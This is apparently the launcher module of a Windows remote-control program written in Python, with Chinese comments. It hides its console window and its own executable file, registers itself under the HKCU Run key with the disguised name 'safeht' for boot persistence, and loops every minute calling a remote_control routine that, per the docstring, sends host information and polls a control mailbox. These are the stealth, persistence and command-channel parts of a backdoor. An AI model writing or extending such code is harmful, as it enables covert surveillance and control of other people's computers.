'''
静默启动
自动启动(修改注册表 ,并且修改文件属性为隐藏)
进程管理
'''
from config import *
import time
import ctypes
import win32api
import win32con
import sys
import psutil


# 设置属性为隐藏
def setAttributes():
    exe_path = sys.argv[0]
    # attr = win32api.GetFileAttributes(exe_path)  # 获取文件的属性
    win32api.SetFileAttributes(exe_path, win32con.FILE_ATTRIBUTE_HIDDEN)


# 开机自启动
def autorun():
    try:
        exe_path = sys.argv[0]  # 不能用os.path
        name = "safeht"
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                  r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                  win32con.KEY_ALL_ACCESS)

        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, exe_path)
        win32api.RegCloseKey(key)
        win32api.SetFileAttributes(exe_path, win32con.FILE_ATTRIBUTE_HIDDEN)  # 设置隐藏属性

    except Exception as e:
        logging.error("注册自启动失败：{}".format(e))


# 获取程序名
def get_progess_name():
    exe_name = os.path.split(sys.argv[0])
    return exe_name[1]


# 监测进程是否已存在
def check_exist():
    '''
    监测进程是否存在，只允许一个进程存在
    如果存在，则不执行，如果不存在执行
    :return:
    '''
    exe_name = get_progess_name()
    # logging.info("程序名:{}".format(exe_name))
    pids = psutil.pids()
    flag = False
    num = 0
    for pid in pids:  # 对所有PID进行循环
        p = psutil.Process(pid)  # 实例化进程对象
        if exe_name.lower() == p.name().lower():  # 判断实例进程名与输入的进程名是否一致（判断进程是否存活）
            if num == 2:
                flag = True
                break
            num = num + 1
    return flag


# 静默启动
def hiding():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)


# 主逻辑
def run():
    '''
    发送主机信息
    轮询监听控制邮箱
    :return:
    '''
    while 1:
        try:
            remote_control()
        except Exception as e:
            logging.error(e)
        time.sleep(60 * 1)


# 启动
def start_run():
    # hiding()
    flag_start = check_exist()
    logging.info(flag_start)
    if flag_start:
        logging.info("已存在保护进程，不再执行新进程")
    else:
        autorun()
        try:
            run()
        except Exception as e:
            logging.error(e)
            time.sleep(20)


if __name__ == "__main__":
    start_run()
